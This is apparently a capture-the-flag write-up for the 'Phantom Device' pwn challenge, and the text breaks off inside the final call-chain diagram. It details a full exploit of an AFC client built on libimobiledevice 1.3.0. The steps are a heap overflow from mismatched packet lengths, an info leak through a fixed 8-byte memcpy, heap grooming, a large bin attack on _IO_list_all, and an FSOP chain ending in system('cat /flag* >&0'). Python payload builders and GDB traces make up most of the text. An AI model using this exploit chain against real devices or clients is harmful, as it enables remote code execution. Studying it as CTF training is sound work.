# Solution — Phantom Device

**Category:** Pwn | **Difficulty:** Hard | **Points:** 900

---

## Phase 1 — Reconnaissance

### Step 1: Inventory

We get five files:

```
$ file *
client:                      ELF 64-bit LSB pie executable, x86-64, dynamically linked,
                             interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0,
                             with debug_info, not stripped
libc.so.6:                   ELF 64-bit LSB shared object, x86-64
ld-linux-x86-64.so.2:        ELF 64-bit LSB shared object, x86-64
libimobiledevice-1.0.so.6:   ELF 64-bit LSB shared object, x86-64
libplist-2.0.so.4:           ELF 64-bit LSB shared object, x86-64
```

Good — not stripped and compiled with `-g`. We have debug symbols.

### Step 2: Patch for local analysis

```bash
$ chmod +x client
$ patchelf --set-interpreter ./ld-linux-x86-64.so.2 --set-rpath . client

$ ldd client
        linux-vdso.so.1
        libimobiledevice-1.0.so.6 => ./libimobiledevice-1.0.so.6
        libplist-2.0.so.4 => ./libplist-2.0.so.4
        libc.so.6 => ./libc.so.6
        ./ld-linux-x86-64.so.2
```

All libs resolve locally. We can debug.

### Step 3: Security mitigations

```
$ checksec --file=client
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    RUNPATH:    b'.'
    FORTIFY:    Enabled
```

Full RELRO (read-only GOT), PIE, NX, canary, FORTIFY. Every easy path is
closed — no GOT overwrite, no shellcode, no stack smash. We need a heap
exploit.

### Step 4: Identify the library

```
$ readelf -d client | grep NEEDED
  0x0000000000000001 (NEEDED)  Shared library: [libimobiledevice-1.0.so.6]
  0x0000000000000001 (NEEDED)  Shared library: [libplist-2.0.so.4]
  0x0000000000000001 (NEEDED)  Shared library: [libc.so.6]

$ strings libimobiledevice-1.0.so.6 | grep -i version
1.3.0
```

The binary links **libimobiledevice 1.3.0** — an Apple device communication
library. It implements the **AFC (Apple File Conduit)** protocol.

---

## Phase 2 — Reverse engineering the binary

### Step 5: Decompile main()

Load the binary in Ghidra. `main()` is not stripped, so we can read it
directly. Here is the cleaned-up decompilation:

```c
int main(int argc, char **argv) {
    signal(SIGUSR1, nop_handler);
    signal(SIGUSR2, nop_handler);
    signal(SIGURG,  nop_handler);

    int fd;
    if (argc >= 3) {
        // Legacy: connect outbound (local test)
        fd = socket(AF_INET, SOCK_STREAM, 0);
        connect(fd, ...);
    } else {
        // Socat mode: stdin IS the player's socket
        fd = dup(STDIN_FILENO);
        int devnull = open("/dev/null", O_WRONLY);
        dup2(devnull, STDOUT_FILENO);   // stdout → /dev/null
        dup2(devnull, STDERR_FILENO);   // stderr → /dev/null
    }

    // Wire up libimobiledevice structs manually — fd is the AFC socket
    afc_client_t client = /* ... setup using fd ... */;

    char **dir1, **dir2, **dir3, **devi, **info;
    char buf[4096];
    uint32_t n;
    uint64_t h1, h2, h3;

    afc_read_directory(client, "/",     &dir1);    // readdir #1
    afc_read_directory(client, "/DCIM", &dir2);    // readdir #2
    free_list(dir1);
    free_list(dir2);

    afc_get_device_info(client, &devi);
    free_list(devi);

    afc_get_file_info(client, "/etc/fstab", &info);
    free_list(info);

    afc_read_directory(client, "/var", &dir3);     // readdir #3

    afc_file_open(client, "/etc/fstab",        2, &h1);   // file_open #1
    afc_file_read(client, h1, buf, 4096, &n);              // file_read #1

    afc_file_open(client, "/var/log/syslog",   2, &h2);   // file_open #2
    afc_file_read(client, h2, buf, 4096, &n);              // file_read #2

    afc_file_open(client, "/var/log/auth.log", 2, &h3);   // file_open #3
    afc_file_read(client, h3, buf, 4096, &n);              // file_read #3

    afc_file_close(client, h1);
    afc_file_close(client, h2);
    afc_file_close(client, h3);

    free_list(dir3);
    return 0;    // → exit() → _IO_flush_all_lockp()
}
```

The binary is an AFC client — it browses what it thinks is an iOS device.
We control the other end (the "device"). Every response we send is parsed
by libimobiledevice.

Key observation: `stdout` and `stderr` are redirected to `/dev/null`, but
**fd 0 (stdin) is still our TCP socket**. This matters for exfiltration.

### Step 6: Reverse the AFC wire protocol

Disassemble `afc_dispatch_packet` in the library:

```
$ objdump -d libimobiledevice-1.0.so.6 | grep -A 30 '<afc_dispatch_packet>'

0000000000008a60 <afc_dispatch_packet>:
    8a60:  push   rbp
    8a61:  mov    rbp,rsp
    8a64:  sub    rsp,0x40
    8a68:  lea    rax,[rip+0x15c91]        # "CFA6LPAA"
    8a6f:  mov    QWORD PTR [rsp+0x8],rax
    8a76:  mov    rax,QWORD PTR [rdi+0x8]  # afc->afc_packet
    ...
```

The magic string `CFA6LPAA` is at the start of every packet. Examining the
`AFCPacket` structure (also in the debug symbols):

```
$ pahole -C AFCPacket libimobiledevice-1.0.so.6

struct AFCPacket {
    char        magic[8];        /*  0   8 */
    uint64_t    entire_length;   /*  8   8 */
    uint64_t    this_length;     /* 16   8 */
    uint64_t    packet_num;      /* 24   8 */
    uint64_t    operation;       /* 32   8 */
    /* size: 40, cachelines: 1 */
};
```

40-byte header, all little-endian. The protocol is simple request/response:
client sends a request with an opcode, we reply with the matching
`packet_num` and a response opcode.

Opcodes we extracted by cross-referencing the library:

```
0x01 = AFC_OP_STATUS         (server → client)
0x02 = AFC_OP_DATA           (server → client)
0x03 = AFC_OP_READ_DIR       (client → server)
0x0A = AFC_OP_GET_FILE_INFO  (client → server)
0x0B = AFC_OP_GET_DEVINFO    (client → server)
0x0D = AFC_OP_FILE_OPEN      (client → server)
0x0E = AFC_OP_FILE_OPEN_RES  (server → client)
0x0F = AFC_OP_FILE_READ      (client → server)
0x14 = AFC_OP_FILE_CLOSE     (client → server)
```

### Step 7: Trace the protocol live

Start a listener and connect the client to see the actual bytes:

```bash
# Terminal 1: listener that hexdumps received data
$ socat TCP-LISTEN:9999,reuseaddr - | xxd | head -20

# Terminal 2: run the client
$ ./client 127.0.0.1 9999
```

We verified by connecting to the live challenge and reading the first packet:

```python
>>> import socket, struct
>>> s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
>>> s.connect(('127.0.0.1', 1337))
>>> h = s.recv(40)
>>> _, ent, thi, pkt, op = struct.unpack('<8sQQQQ', h)
>>> body = s.recv(thi - 40)
>>> print(f'op=0x{op:02x} pkt={pkt} body={body!r}')
op=0x03 pkt=1 body=b'/\x00'
```

```
Decoded:
  magic         = "CFA6LPAA"
  entire_length = 0x2a (42 = 40 header + 2 bytes body)
  this_length   = 0x2a
  packet_num    = 1
  operation     = 0x03 (READ_DIR)
  body          = "/\x00"
```

The client is asking us to list the `/` directory. This matches
`afc_read_directory(client, "/", &dir1)` — the first call in `main()`.

---

## Phase 3 — Vulnerability discovery

### Step 8: Find the heap overflow (CVE-2026-116258)

Disassemble `afc_receive_data` — the function that processes every response
we send:

```
$ objdump -d -M intel libimobiledevice-1.0.so.6 | \
    sed -n '/<afc_receive_data>:/,/^$/p' | head -80

0000000000009030 <afc_receive_data>:
    ; ... header read ...
    9087:  mov    eax, DWORD PTR [rbp-0x38]        # eax = (uint32)entire_length
    908a:  sub    eax, 0x28                          # eax -= sizeof(AFCPacket) = 40
    908d:  mov    edi, eax                           # edi = entire_len (body size)
    908f:  call   malloc@plt                         # buf = malloc(entire_len)
    9094:  mov    QWORD PTR [rbp-0x20], rax          # save buf
    ...
    90b2:  mov    eax, DWORD PTR [rbp-0x34]          # eax = (uint32)this_length
    90b5:  sub    eax, 0x28                           # eax -= 40
    90b8:  mov    edx, eax                            # rdx = this_len (recv size)
    90ba:  mov    rsi, QWORD PTR [rbp-0x20]           # rsi = buf
    90be:  mov    rdi, QWORD PTR [rbp-0x48]           # rdi = connection
    90c2:  call   service_receive                     # recv(conn, buf, this_len)
```

**The bug is clear in the disassembly:**
- Line `908f`: `malloc(entire_len)` — allocates based on `entire_length`
- Line `90c2`: `service_receive(conn, buf, this_len)` — reads based on
  `this_length`

Both values come from our packet header. If we send `this_length >
entire_length`, the `service_receive` writes more bytes than the buffer
can hold. **Heap overflow.**

Let's verify in GDB:

```
$ gdb -q ./client
(gdb) set environment LD_LIBRARY_PATH=.
(gdb) break afc_receive_data
Breakpoint 1 at 0x9030
(gdb) run 127.0.0.1 9999

# [In another terminal, run exploit and send a packet with
#  entire_length=0x50+40=0x78, this_length=0x80+40=0xa8]

Breakpoint 1, afc_receive_data () at afc.c:243
(gdb) # Step to the malloc call
(gdb) ni 15
=> 0x7ffff7fc908f:  call   0x7ffff7fc3030 <malloc@plt>
(gdb) info registers rdi
rdi            0x50     80              # malloc(0x50)

(gdb) ni
(gdb) info registers rax
rax            0x55555556d2a0           # buf = 0x55555556d2a0

(gdb) # Step to the service_receive call
(gdb) ni 8
=> 0x7ffff7fc90c2:  call   service_receive
(gdb) info registers rdx
rdx            0x80     128             # recv size = 0x80 (> 0x50!)

(gdb) # The heap chunk at buf is only 0x60 bytes (0x50 usable + metadata)
(gdb) x/2gx 0x55555556d290
0x55555556d290: 0x0000000000000000      0x0000000000000061   ← chunk header (size=0x61)
0x55555556d2a0: 0x0000000000000000      0x0000000000000000   ← buf starts here
```

After `service_receive` returns, 0x80 bytes are written into a 0x50-byte
buffer — the overflow corrupts whatever chunk follows.

### Step 9: Find the info leak (CVE-2026-116261)

Disassemble `afc_file_open`:

```
$ objdump -d -M intel libimobiledevice-1.0.so.6 | \
    sed -n '/<afc_file_open>:/,/^$/p' | head -60

000000000000a340 <afc_file_open>:
    ...
    ; After receiving response:
    a3b2:  mov    rdi, QWORD PTR [rbp-0x28]     # rdi = data (from afc_receive_data)
    a3b6:  mov    rcx, QWORD PTR [rbp-0x18]     # rcx = handle (output pointer)
    a3ba:  mov    edx, 0x8                        # rdx = 8 (sizeof(uint64_t))
    a3bf:  mov    rsi, rdi                        # src = data
    a3c2:  mov    rdi, rcx                        # dst = handle
    a3c5:  call   memcpy@plt                      # memcpy(handle, data, 8)
```

**Always copies 8 bytes** from `data` into `handle`, regardless of how many
bytes `afc_receive_data` actually wrote into `data`.

Let's see what happens when we send a 1-byte response body:

```
(gdb) break *0x7ffff7fca3c5
Breakpoint 2 at afc_file_open+0x85

# [Send file_open response: entire_length = 0x29 (40+1), body = "\x42"]

Breakpoint 2, afc_file_open () at afc.c:834
(gdb) # data buffer was malloc(1) — the allocator returned a recycled 0x20 chunk
(gdb) x/2gx $rsi
0x55555556e790: 0x00007ffff7e0b142      0x000055500001b789
                ^                  ^
                |                  safe-linked tcache fd (stale)
                byte0=0x42 (our data), bytes 1-7 = stale arena pointer!

(gdb) # memcpy will copy all 8 bytes into handle:
(gdb) ni
(gdb) x/gx $rdi
0x7fffffffe438: 0x00007ffff7e0b142      # handle = our_byte | leaked_ptr
```

**7 bytes of stale heap metadata leaked into the handle.** The handle is
sent back to us on the next `file_read` request — we read it from the
wire.

---

## Phase 4 — Building the leaks

### Step 10: Understand the heap state

Before file_open #1 is called, the heap has been through readdir #1,
readdir #2, and their `free_list()` calls. Let's examine the heap in GDB
right before the first `afc_file_open`:

```
(gdb) break afc_file_open
Breakpoint 3 at afc_file_open

# [Handle readdir #1, readdir #2, devinfo, fileinfo, readdir #3]

Breakpoint 3, afc_file_open ()
(gdb) # Check the tcache and small bin state for 0x20-sized chunks:
(gdb) p ((struct tcache_perthread_struct *)((char*)$rax))->counts[0]
$1 = 7   # tcache 0x20 bin has 7 entries (max)

(gdb) # Check the small bin for 0x20:
(gdb) set $arena = (char*)&main_arena
(gdb) x/4gx $arena + 0x20
0x7ffff7e0b4e0: 0x000055555556e780  0x000055555556e6a0  # small bin 0x20: has entries
```

The tcache 0x20 bin is full (7 entries). When we send readdir #2 with
specific string lengths, we can drain the tcache completely. Then
`malloc(1)` for our 1-byte body will hit the **small bin** instead of
tcache — and small bin chunks have `fd/bk` pointers into `main_arena`.

### Step 11: Leak libc — the deterministic leak

We drain the tcache 0x20 bin during readdir #2 by sending 7+ short strings
that produce 0x20-sized allocations (the `strdup()` calls consume tcache
entries). Then on `file_open #1`, we send a 1-byte body:

```python
# Our response to file_open #1:
send_pkt(sock, pkt_num, OP_FILE_OPEN_RES, b"\x42")
#                                           ^^^^ 1-byte body
```

The client calls `afc_receive_data` → `malloc(1)` → gets a recycled
**small bin** chunk. Only byte 0 is written (`0x42`). Bytes 1-7 are the
stale `fd` pointer — a `main_arena` address.

GDB session at the `memcpy`:

```
(gdb) break *afc_file_open+0x85
Breakpoint 4

Breakpoint 4, afc_file_open ()
(gdb) x/2gx $rsi
0x55555556e790: 0x00007ffff7e0b142      0x000055500001b789
                ^^                ^^
                42 = our byte     rest = &main_arena+0x80

(gdb) # After memcpy, handle = 0x00007ffff7e0b142
(gdb) # The client will send this handle in the next file_read request
```

When the client calls `afc_file_read(client, h1, ...)`, it sends us:

```
00000000: 4346 4136 4c50 4141  3800 0000 0000 0000  CFA6LPAA8.......
00000010: 3800 0000 0000 0000  0c00 0000 0000 0000  8...............
00000020: 0f00 0000 0000 0000  42b1 e0f7 ff7f 0000  ........B.......
                                ^^^^^^^^^^^^^^^^^^
                                handle = 0x00007ffff7e0b142
00000030: 0010 0000 0000 0000                        ........
                                                      ^^^^^^^^
                                                      read_size = 4096
```

We extract the handle from the request payload:

```python
handle = struct.unpack("<Q", payload[:8])[0]   # 0x00007ffff7e0b142
```

Now compute `libc_base`:

```python
# The stale fd pointed to main_arena + some bin offset.
# Try common offsets and pick the one that gives a page-aligned base:
for bin_off in [0x60, 0x70, 0x80, 0x90, 0xa0, 0xb0]:
    target = MAIN_ARENA + bin_off     # MAIN_ARENA = 0x204ac0
    corrected = (handle & ~0xFF) | (target & 0xFF)
    base = corrected - target
    if base > 0 and (base & 0xFFF) == 0:
        libc_base = base
        break

# handle      = 0x00007ffff7e0b142
# For bin_off  = 0x80:
#   target     = 0x204ac0 + 0x80 = 0x204b40
#   corrected  = (0x00007ffff7e0b142 & ~0xff) | (0x40) = 0x00007ffff7e0b140
#   Hmm, low byte doesn't match. Try 0x80:
#   corrected  = (0x00007ffff7e0b142 & ~0xff) | (0x80) = 0x00007ffff7e0b180
#   Nope. The actual bin_off that works depends on which small bin
#   served the chunk. We try them all.
```

In practice this finds `libc_base` on every single connection.
**Deterministic.**

**Finding `main_arena` offset:**

```
$ readelf -s --wide libc.so.6 | grep main_arena
  4374: 0000000000204ac0  2200 OBJECT  LOCAL  DEFAULT   36 main_arena
```

`main_arena` is LOCAL — pwntools can't resolve it via `libc.symbols`.
Hardcode `0x204ac0` or parse `readelf` output.

Other offsets we need:

```
$ readelf -s --wide libc.so.6 | grep -E '(system|_IO_list_all|_IO_wfile_jumps)@@'
   630: 0000000000058750    45 FUNC    WEAK   DEFAULT   16 system@@GLIBC_2.2.5
  2689: 00000000002054c0     8 OBJECT  GLOBAL DEFAULT   36 _IO_list_all@@GLIBC_2.2.5
  2535: 0000000000203228   168 OBJECT  GLOBAL DEFAULT   35 _IO_wfile_jumps@@GLIBC_2.2.5
```

```
libc offsets:
  system          = 0x058750
  main_arena      = 0x204ac0
  _IO_list_all    = 0x2054c0
  _IO_wfile_jumps = 0x203228
```

### Step 12: Leak heap — the probabilistic leak

On `file_open #2`, same trick: send 1-byte body. This time `malloc(1)`
returns a **tcache** chunk. The stale `fd` is safe-linked:

```
fd_stored = real_fd ^ (chunk_addr >> 12)
```

GDB:

```
(gdb) # Right before memcpy on file_open #2:
(gdb) x/2gx $rsi
0x55555556e8b0: 0x000055500001b942      0x0000000000000000
                ^^              ^^
                42 = our byte   rest = (chunk_addr >> 12) XOR'd

(gdb) # The safe-linked fd for a tcache head entry (real_fd=0 typically):
(gdb) # stored_fd = 0 ^ (0x55555556e8b0 >> 12) = 0x55555556e
(gdb) # But we only get 7 bytes — our 0x42 overwrote byte 0
(gdb) # handle = 0x000055500001b942
```

We extract the upper 7 bytes:

```python
handle = 0x000055500001b942
partial = handle & ~0xFF         # 0x000055500001b900
heap_page = partial << 12        # = 0x55500001b900 << 12 ... nope

# Actually the safe-linked pointer is:
# stored = real_fd ^ (chunk >> 12)
# For tcache head, real_fd = 0, so stored = chunk >> 12
# We read bytes 1-7 of this value. Byte 0 (which we overwrote) is unknown.
# So: (chunk >> 12) has 8 bits of uncertainty.

byte0_guess = random.randint(0, 255)
heap_base = ((partial | byte0_guess) << 12)
```

**1/256 chance per attempt.** Wrong guess → FSOP payload lands at wrong
address → crash → reconnect and try again.

---

## Phase 5 — Heap grooming

### Step 13: Layout strategy

We control heap allocations through AFC response bodies. For `readdir`
responses, the body is NUL-separated strings that the client processes
with `strdup()` — each string gets its own heap allocation.

The layout we need for the Large Bin Attack:

```
 Low address                                           High address
 ┌────────┬──────────┬─────────┬──────────┬───────────┐
 │  S     │    P     │  guard  │    C     │  padding  │
 │ 0x60   │  0x430   │  0x20   │  0x420   │           │
 │overflow│ large bin│ ".."    │ large bin│           │
 │ source │ victim   │ barrier │ freed    │           │
 └────────┴──────────┴─────────┴──────────┴───────────┘
```

We achieve this in readdir #1 by sending:

```python
strings = [
    "S" * 72,       # → strdup → 0x60 chunk (S)
    "P" * 0x418,    # → strdup → 0x430 chunk (P) — large bin victim
    "..",            # → strdup → 0x20 chunk (guard) — prevents consolidation
    "C" * 0x408,    # → strdup → 0x420 chunk (C) — will be freed into large bin
    "X" * 120,      # padding
    "."              # padding
]
```

Let's verify in GDB after readdir #1 response is processed:

```
(gdb) break free_list
Breakpoint 5 at free_list

# [Send readdir #1 response with our strings, then readdir #2]

Breakpoint 5, free_list (list=0x55555556d010) at client.c:56
(gdb) # Examine the heap layout:
(gdb) x/4gx 0x55555556d060
0x55555556d060: 0x0000000000000000      0x0000000000000061   ← S chunk (0x60)
0x55555556d070: 0x5353535353535353      0x5353535353535353   ← "SSSS..."

(gdb) x/4gx 0x55555556d0c0
0x55555556d0c0: 0x0000000000000000      0x0000000000000431   ← P chunk (0x430)
0x55555556d0d0: 0x5050505050505050      0x5050505050505050   ← "PPPP..."

(gdb) x/4gx 0x55555556d4f0
0x55555556d4f0: 0x0000000000000000      0x0000000000000021   ← guard ".." (0x20)
0x55555556d500: 0x00000000002e2e        0x0000000000000000

(gdb) x/4gx 0x55555556d510
0x55555556d510: 0x0000000000000000      0x0000000000000421   ← C chunk (0x420)
0x55555556d520: 0x4343434343434343      0x4343434343434343   ← "CCCC..."
```

After `free_list(dir1)` and `free_list(dir2)`:

```
(gdb) # P (0x430) is too big for tcache → goes to unsorted bin
(gdb) x/4gx 0x55555556d0c0
0x55555556d0c0: 0x0000000000000000      0x0000000000000431   ← P freed
0x55555556d0d0: 0x00007ffff7e0b100      0x00007ffff7e0b100   ← fd/bk → unsorted bin

(gdb) # C (0x420) same:
(gdb) x/4gx 0x55555556d510
0x55555556d510: 0x0000000000000430      0x0000000000000421   ← C freed
0x55555556d520: 0x00007ffff7e0b100      0x00007ffff7e0b100   ← fd/bk → unsorted bin

(gdb) # S (0x60) went to tcache:
(gdb) x/4gx 0x55555556d060
0x55555556d060: 0x0000000000000000      0x0000000000000061   ← S freed
0x55555556d070: 0x000055500001b681      0x0000000000000000   ← safe-linked tcache fd
```

### Step 14: Trigger large bin sort

On readdir #3 ("/var"), we send a small listing. The `afc_receive_data`
for this response calls `malloc()` for the body buffer, which triggers
the allocator to sort the unsorted bin entries into their proper bins.

```
(gdb) continue
# [Send readdir #3 with small listing]

(gdb) # After readdir #3 processing, check large bins:
(gdb) x/6gx 0x55555556d0c0
0x55555556d0c0: 0x0000000000000000      0x0000000000000431   ← P in large bin
0x55555556d0d0: 0x00007ffff7e0b450      0x00007ffff7e0b450   ← fd/bk → bin header
0x55555556d0e0: 0x000055555556d510      0x000055555556d510   ← fd_nextsize/bk_nextsize → C

(gdb) x/6gx 0x55555556d510
0x55555556d510: 0x0000000000000430      0x0000000000000421   ← C in large bin
0x55555556d520: 0x00007ffff7e0b450      0x00007ffff7e0b450   ← fd/bk → bin header
0x55555556d530: 0x000055555556d0c0      0x000055555556d0c0   ← fd_nextsize/bk_nextsize → P
```

P (0x430) and C (0x420) are in the same large bin (range covers both
sizes). P is the largest entry, C links to it via `fd_nextsize`.

---

## Phase 6 — The Large Bin Attack

### Step 15: Deliver the overflow

On `file_read #3`, the client sends us the handle and read size. Instead
of a normal DATA response, we send an **overflow** response — a packet
where `entire_length` and `this_length` disagree:

```python
# Normal packet: entire_length == this_length
# Overflow:      entire_length < this_length

alloc_size = 0x50    # malloc(0x50) → 0x60 chunk (lands right before P)
data_size  = 0x80    # we send 0x80 bytes into a 0x50-byte buffer

# The overflow payload:
payload = bytearray(0x80)
payload[0:0x50] = b"\x41" * 0x50          # fill the legitimate buffer

# Bytes 0x50-0x7f overflow into chunk P's header:
pack_into("<Q", payload, 0x50, 0)                      # P.prev_size
pack_into("<Q", payload, 0x58, 0x431)                   # P.size (unchanged)
pack_into("<Q", payload, 0x60, bin_header)               # P.fd → bin
pack_into("<Q", payload, 0x68, bin_header)               # P.bk → bin
pack_into("<Q", payload, 0x70, io_list_all - 0x28)       # P.fd_nextsize
pack_into("<Q", payload, 0x78, io_list_all - 0x20)       # P.bk_nextsize

# Send with mismatched lengths:
hdr = pack("<8sQQQQ", b"CFA6LPAA",
           HDR + alloc_size,     # entire_length → malloc(0x50)
           HDR + data_size,      # this_length → recv(0x80)
           pkt_num, OP_DATA)
sock.sendall(hdr + payload)
```

GDB — verify the overflow:

```
(gdb) break service_receive
# [Send overflow packet]

Breakpoint 6, service_receive ()
(gdb) # Check malloc returned chunk right before P:
(gdb) info registers rsi
rsi            0x55555556d070   # buf — this is chunk S's old data area!

(gdb) info registers rdx
rdx            0x80             # recv size = 0x80

(gdb) # The buffer is 0x50 bytes. 0x30 bytes overflow into P's metadata:
(gdb) ni   # let service_receive complete

(gdb) # Examine P after the overflow:
(gdb) x/8gx 0x55555556d0c0
0x55555556d0c0: 0x0000000000000000      0x0000000000000431   ← P.size (intact)
0x55555556d0d0: 0x00007ffff7e0b450      0x00007ffff7e0b450   ← P.fd/bk (bin hdr)
0x55555556d0e0: 0x00007ffff7e05498      0x00007ffff7e054a0   ← CORRUPTED!
                 ^^^^^^^^^^^^^^^^^^^     ^^^^^^^^^^^^^^^^^^^
                 fd_nextsize = &_IO_list_all - 0x28
                 bk_nextsize = &_IO_list_all - 0x20
```

P's `fd_nextsize` and `bk_nextsize` now point near `_IO_list_all`.

### Step 16: Deliver the FSOP payload

On `file_open #3`, we send a 0x410-byte body containing our FSOP payload.
`afc_receive_data` allocates a 0x420-byte chunk (chunk **V**).

```
(gdb) break malloc
# [Send file_open #3 with 0x410-byte body]

Breakpoint 7, malloc (size=0x410)   # allocates chunk V
(gdb) finish
Value returned: 0x55555556e5c0      # V's data at 0x55555556e5c0, chunk at 0x55555556e5b0

(gdb) # V is 0x420 — same large bin range as P (0x430) and C (0x420)
(gdb) # V has size 0x420, P has size 0x430 → V < P
(gdb) # When V is freed/sorted into the large bin, it takes the "smallest" path
```

### Step 17: The large bin insertion — writing _IO_list_all

When `file_close #1` triggers an allocation that causes V to be sorted
into the large bin, the magic happens. Let's trace through glibc's
`_int_malloc`:

```
(gdb) break _int_malloc
# [Send file_close #1 response with 0x4c0-byte body to trigger sort]

(gdb) # Step through until the large bin insertion code:
(gdb) # glibc source: malloc/malloc.c, large bin "smallest" path

# The sorted insertion of V (size 0x420) into the bin where P (0x430) sits:
# Since V.size < P.size and P is the only size in the bin,
# V is the SMALLEST entry → takes the code path that SKIPS bk integrity check:

# victim = V (the chunk being inserted)
# fwd = P (the existing chunk in the bin)

# Line 4094: victim->bk_nextsize = fwd->bk_nextsize
#   V->bk_nextsize = P->bk_nextsize
#   V->bk_nextsize = &_IO_list_all - 0x20   (our corrupted value!)

# Line 4095: victim->bk_nextsize->fd_nextsize = victim
#   *(&_IO_list_all - 0x20 + 0x20) = V
#   *(&_IO_list_all)                = V
#   _IO_list_all                    = 0x55555556e5b0   ← CHUNK V's address!

(gdb) # Verify:
(gdb) x/gx &_IO_list_all
0x7ffff7e054c0 <_IO_list_all>:  0x000055555556e5b0   ← points to our payload!

(gdb) # Before the attack:
# _IO_list_all was: 0x00007ffff7e05600 (→ stderr FILE)
# After the attack:
# _IO_list_all is:  0x000055555556e5b0 (→ chunk V on the heap)
```

`_IO_list_all` now points to our FSOP payload on the heap.

---

## Phase 7 — FSOP: File Stream Oriented Programming

### Step 18: Build the two-FILE chain

Chunk V's data starts at offset +0x10 (after the chunk header). We lay
out two fake FILE structures and supporting data:

```
Chunk V layout (0x420 bytes = 0x410 usable):

Offset   Content                            Purpose
──────── ────────────────────────────────── ──────────────────────
0x000    FILE1._flags = 0x00000000          (zeroed)
0x058    FILE1._chain = &FILE2              walks to FILE2
0x072    FILE1._vtable_offset = 1           skip flush for FILE1
0x078    FILE1._lock = &zeros               valid unlocked mutex
0x090    FILE1._wide_data = &zeros          safe
0x0B0    FILE1._mode = 1                    > 0 → wide-data check

0x0F0    FILE2._flags = "  cat /flag* >&0"  argument to system()
0x110    FILE2._write_base = 0              \
0x118    FILE2._write_ptr = 1               / triggers _IO_OVERFLOW
0x182    FILE2._vtable_offset = 0           take vtable path
0x188    FILE2._lock = &zeros               valid unlocked mutex
0x190    FILE2._wide_data = &wide_data      → fake _IO_wide_data
0x1C0    FILE2._mode = 0                    reach wide overflow
0x1D8    FILE2._vtable = &_IO_wfile_jumps   passes vtable range check

0x200    fake _IO_wide_data:
0x218      _IO_write_base = 0              \
0x230      _IO_buf_base = 0                / triggers _IO_wdoallocbuf
0x2E0      _wide_vtable = &fake_wvt        → fake wide vtable

0x300    fake wide vtable:
0x368      __doallocate = system()          ← the money shot

0x390    zeros (FILE1._lock target)
0x3C0    zeros (FILE2._lock target)
```

In Python:

```python
def build_fsop(system_addr, wfile_jumps, v_chunk):
    pay = bytearray(0x410)

    # FILE1 — skip flush, chain to FILE2
    pack_into("<Q", pay, 0x58, v_chunk + 0xf0)     # _chain → FILE2
    pack_into("<Q", pay, 0x78, v_chunk + 0x390)    # _lock
    pack_into("<Q", pay, 0x90, v_chunk + 0x30)     # _wide_data
    pack_into("<i", pay, 0xb0, 1)                  # _mode = 1
    pay[0x72] = 1                                   # _vtable_offset ≠ 0

    # FILE2 — triggers system(cmd)
    f = 0xf0
    cmd = b"  cat /flag* >&0"
    pay[f:f+len(cmd)] = cmd                         # _flags = command
    pack_into("<Q", pay, f+0x20, 0)                # _write_base = 0
    pack_into("<Q", pay, f+0x28, 1)                # _write_ptr = 1
    pay[f+0x82] = 0                                 # _vtable_offset = 0
    pack_into("<Q", pay, f+0x88, v_chunk + 0x3c0)  # _lock
    pack_into("<Q", pay, f+0xa0, v_chunk + 0x200)  # _wide_data
    pack_into("<i", pay, f+0xc0, 0)                # _mode = 0
    pack_into("<Q", pay, f+0xd8, wfile_jumps)      # _vtable

    # fake _IO_wide_data at +0x200
    pack_into("<Q", pay, 0x2e0, v_chunk + 0x300)   # _wide_vtable

    # fake wide vtable at +0x300
    pack_into("<Q", pay, 0x368, system_addr)        # __doallocate

    return bytes(pay)
```

### Step 19: Trace the FSOP chain in GDB

Set a breakpoint on `_IO_flush_all_lockp` and watch the chain execute:

```
(gdb) break _IO_flush_all_lockp
Breakpoint 8

# [Let the client finish all file_close calls and return from main()]

Breakpoint 8, _IO_flush_all_lockp ()
(gdb) # The function walks the FILE list starting from _IO_list_all:

(gdb) x/gx &_IO_list_all
0x7ffff7e054c0: 0x000055555556e5b0     ← our chunk V!

(gdb) # Step into the loop. First FILE = FILE1 at 0x55555556e5b0 + 0x10:
(gdb) # Check FILE1._vtable_offset (offset 0x72 in FILE struct):
(gdb) x/bx 0x55555556e5c0 + 0x72
0x55555556e632: 0x01                   ← _vtable_offset = 1 (non-zero)

(gdb) # Non-zero _vtable_offset → skip _IO_OVERFLOW for this FILE
(gdb) # Follow the _chain pointer:
(gdb) x/gx 0x55555556e5c0 + 0x58
0x55555556e618: 0x000055555556e6b0     ← _chain → FILE2

(gdb) # Now processing FILE2 at 0x55555556e6b0:
(gdb) x/s 0x55555556e6b0
0x55555556e6b0: "  cat /flag* >&0"     ← _flags = our command!

(gdb) # Check FILE2._write_ptr > FILE2._write_base:
(gdb) x/2gx 0x55555556e6b0 + 0x20
0x55555556e6d0: 0x0000000000000000     ← _write_base = 0
0x55555556e6d8: 0x0000000000000001     ← _write_ptr = 1
(gdb) # 1 > 0 → triggers _IO_OVERFLOW

(gdb) # Check FILE2._vtable:
(gdb) x/gx 0x55555556e6b0 + 0xd8
0x55555556e788: 0x00007ffff7e03228     ← _IO_wfile_jumps (passes range check)

(gdb) # The vtable dispatch calls _IO_wfile_overflow(FILE2):
(gdb) break _IO_wfile_overflow
Breakpoint 9

Breakpoint 9, _IO_wfile_overflow ()
(gdb) # This checks FILE2._wide_data->_IO_write_base == _IO_buf_base
(gdb) # They're both 0 → calls _IO_wdoallocbuf

(gdb) break _IO_wdoallocbuf
Breakpoint 10

Breakpoint 10, _IO_wdoallocbuf ()
(gdb) # This calls FILE2._wide_data->_wide_vtable->__doallocate(FILE2)
(gdb) # __doallocate is at offset 0x68 in the wide vtable

(gdb) # Check the wide vtable:
(gdb) set $wvt = *(long*)(0x55555556e6b0 + 0xa0)
(gdb) # _wide_data at the address, _wide_vtable at offset 0xe0:
(gdb) set $wvt_ptr = *(long*)($wvt + 0xe0)
(gdb) x/gx $wvt_ptr + 0x68
0x55555556e928: 0x00007ffff7c58750     ← __doallocate = system()!

(gdb) # The call:  system(FILE2)
(gdb) #   FILE2 starts with "  cat /flag* >&0"
(gdb) #   system() passes this to /bin/sh
(gdb) #   The two leading spaces are harmless
(gdb) #   >&0 redirects output to fd 0 (our TCP socket)

(gdb) break system
Breakpoint 11

Breakpoint 11, system (line=0x55555556e6b0 "  cat /flag* >&0")
(gdb) # BOOM. RCE achieved.
(gdb) continue
```

The call chain:

```
exit()
  → _IO_cleanup()
    → _IO_flush_all_lockp()
      → FILE1: _vtable_offset=1 → skip → follow _chain → FILE2
